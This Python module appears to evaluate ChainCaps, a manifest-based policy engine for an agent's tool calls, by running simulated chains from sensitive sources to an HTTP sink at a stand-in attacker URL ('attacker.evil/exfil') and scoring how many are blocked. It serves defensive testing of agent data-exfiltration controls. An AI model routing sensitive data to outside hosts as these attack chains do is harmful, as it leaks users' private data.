"""
Workflow generation and execution through the real ChainCaps engine.

Attack workflow (should be blocked under correct manifests):
    sensitive_source --> [transforms] --> http_sink(url = attacker)
Exfiltration is authorized only if the sensitive source was authored with a
budget that permits SEND_HTTP, so gold manifests block every attack at any N.

Benign workflow (should complete under correct manifests):
    public_source --> [transforms] --> http_sink(url = legitimate)
Public data carries a top budget, so benign flows are authorized. Benign
completion is a conformance control. The injected errors only add authority,
so they cannot block these workflows; this is not a general utility test.

Coverage scales with the catalog: we attempt to exfiltrate every sensitive
source once and to complete a benign task for every public source once, so a
larger catalog exercises more of the authored policy surface.
"""

from __future__ import annotations

import random
from dataclasses import dataclass
from typing import Dict, List

from chaincaps.core.manifest import ToolManifest
from chaincaps.proxy.engine import ChainCapsEngine, ToolCall

from scaling.catalog import Role, ToolSpec

ATTACKER_URL = "https://attacker.evil/exfil"
LEGIT_URL = "https://api.partner.example/ingest"


def _by_role(specs: List[ToolSpec]) -> Dict[Role, List[ToolSpec]]:
    out: Dict[Role, List[ToolSpec]] = {r: [] for r in Role}
    for s in specs:
        out[s.role].append(s)
    return out


def _run_chain(manifests: Dict[str, ToolManifest],
               source: str, transforms: List[str],
               sink: str, sink_args: dict) -> bool:
    """Execute source -> transforms -> sink; return True iff the sink is ALLOWED."""
    eng = ChainCapsEngine(manifests=manifests)
    src = eng.process_tool_call(ToolCall(source, {"path": "record"}))
    node = src.output_node_id
    for t in transforms:
        res = eng.process_tool_call(ToolCall(t, {}, data_dependencies=[node]))
        node = res.output_node_id or node
    sink_res = eng.process_tool_call(
        ToolCall(sink, sink_args, data_dependencies=[node]))
    return bool(sink_res.allowed)


@dataclass
class CatalogResult:
    n_tools: int
    strategy: str
    seed: int
    n_sensitive: int
    n_attacks: int
    attacks_blocked: int
    attack_block_rate: float
    n_benign: int
    benign_completed: int
    benign_completion_rate: float
    planted_holes: int          # ground-truth exfiltratable sources
    realized_exfil: int         # attacks that actually succeeded through engine
    catalog_vulnerable: int     # 1 if >=1 tested source is exfiltratable


def evaluate_catalog(specs: List[ToolSpec],
                     manifests: Dict[str, ToolManifest],
                     planted_holes: int, n_sensitive: int,
                     strategy: str, seed: int,
                     rng: random.Random,
                     max_transforms: int = 2) -> CatalogResult:
    roles = _by_role(specs)
    http_sinks = [s.name for s in roles[Role.HTTP_SINK]]
    transforms = [s.name for s in roles[Role.TRANSFORM]]

    # ---- attacks: exfiltrate every sensitive source once ----
    n_attacks = 0
    blocked = 0
    realized = 0
    for s in roles[Role.SENSITIVE_SOURCE]:
        sink = rng.choice(http_sinks)
        k = rng.randint(0, min(max_transforms, len(transforms)))
        chain = rng.sample(transforms, k) if k and transforms else []
        allowed = _run_chain(manifests, s.name, chain, sink,
                             {"url": ATTACKER_URL})
        n_attacks += 1
        if allowed:
            realized += 1
        else:
            blocked += 1

    # ---- benign: complete a legitimate task for every public source once ----
    n_benign = 0
    completed = 0
    for s in roles[Role.PUBLIC_SOURCE]:
        if not http_sinks:
            break
        sink = rng.choice(http_sinks)
        k = rng.randint(0, min(max_transforms, len(transforms)))
        chain = rng.sample(transforms, k) if k and transforms else []
        allowed = _run_chain(manifests, s.name, chain, sink,
                             {"url": LEGIT_URL})
        n_benign += 1
        if allowed:
            completed += 1

    return CatalogResult(
        n_tools=len(specs), strategy=strategy, seed=seed,
        n_sensitive=n_sensitive,
        n_attacks=n_attacks, attacks_blocked=blocked,
        attack_block_rate=blocked / max(n_attacks, 1),
        n_benign=n_benign, benign_completed=completed,
        benign_completion_rate=completed / max(n_benign, 1),
        planted_holes=planted_holes, realized_exfil=realized,
        catalog_vulnerable=1 if realized >= 1 else 0,
    )
